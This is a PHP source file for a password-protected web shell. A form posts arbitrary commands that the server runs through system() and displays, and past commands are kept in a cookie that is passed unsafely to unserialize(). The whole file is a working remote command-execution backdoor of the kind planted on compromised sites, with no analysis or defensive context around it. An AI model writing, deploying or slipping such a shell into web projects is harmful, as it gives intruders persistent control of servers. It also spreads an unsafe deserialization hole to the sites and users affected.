<?php
exit;
#define('AUTH_KEY', sprintf("leakon_~!@#$^_%s", date('Y-m-d')));
if (file_exists('web_inc.php')) {
	require_once('web_inc.php');
} else {
	exit;
}

set_time_limit(0);

date_default_timezone_set( 'PRC' );
header("Content-Type: text/html; charset=UTF-8");

define('REQUEST_COMMAND',	trim($_POST['command']));
define('REQUEST_PASSWORD',	trim($_POST['password']));
define('REQUEST_SAVE_CMD',	$_POST['save_command']);

$authenticated	= md5(AUTH_KEY) == REQUEST_PASSWORD;

if ($authenticated) {

	$strContentOfCommand	= '';

	if (strlen(REQUEST_COMMAND)) {

		if (1 == REQUEST_SAVE_CMD) {

		#	print_r($_COOKIE);

			$arrCookie	= (array) unserialize($_COOKIE['cmd']);

		#	print_r($arrCookie);

			if (!in_array(REQUEST_COMMAND, $arrCookie)) {
				array_unshift($arrCookie, REQUEST_COMMAND);
		#	print_r($arrCookie);
				setcookie("cmd", serialize($arrCookie), (time() + 100 * 86400));
			}

		}

		ob_start();
		system(REQUEST_COMMAND);
		$strContentOfCommand	= ob_get_contents();
		ob_end_clean();
	}


	$strContentOfCommand	= mb_convert_encoding($strContentOfCommand, 'UTF-8', 'GBK');

}

?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="zh" xml:lang="zh">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>WebShell</title>


<style type="text/css">

body, input	{margin:2px; font-family: Lucida Console; font-size:14px;}

pre		{font-family:Lucida Console; font-size:14px; font-weight:bold; background:black; color:white; padding: 4px; margin:0 0 4px;}

p		{line-height:8px; margin:0;}

p input		{vertical-align:middle; }

.inputText	{width:600px; height:16px; padding:4px; background: #ffffa0;}

.button		{padding:6px;}

</style>

<script type="text/javascript">


</script>

<head>

<body>

<?php

if (strlen($strContentOfCommand)) :

echo	'<pre>';

echo	htmlspecialchars($strContentOfCommand);

echo	'</pre>';

endif;

?>


<form name="myForm" id="myForm" method="post" action="">

<p>
<input type="text" name="command" value="<?php echo htmlspecialchars(REQUEST_COMMAND) ?>" class="inputText" />
<?php if (!$authenticated) : ?>
<br />
<input type="text" name="password" value="<?php echo REQUEST_PASSWORD ?>" class="inputText" style="width:300px;" />
<?php else : ?>
<input type="hidden" name="password" value="<?php echo REQUEST_PASSWORD ?>" class="inputText" style="width:300px;" />
<?php endif ?>
</p>

<p>

<input type="submit" value="Execute" class="button" />

<input type="checkbox" id="idSaveCmd" name="save_command" value="1" checked="checked" /><label for="idSaveCmd">SaveCommand</label>

</p>

<?php if (!empty($arrCookie)) : ?>
<ul>
<?php

foreach ($arrCookie as $cmd) {
	echo	sprintf("<li>%s</li>", htmlspecialchars($cmd));
}
?>
</ul>
<?php endif ?>

</form>


</body>
</html>
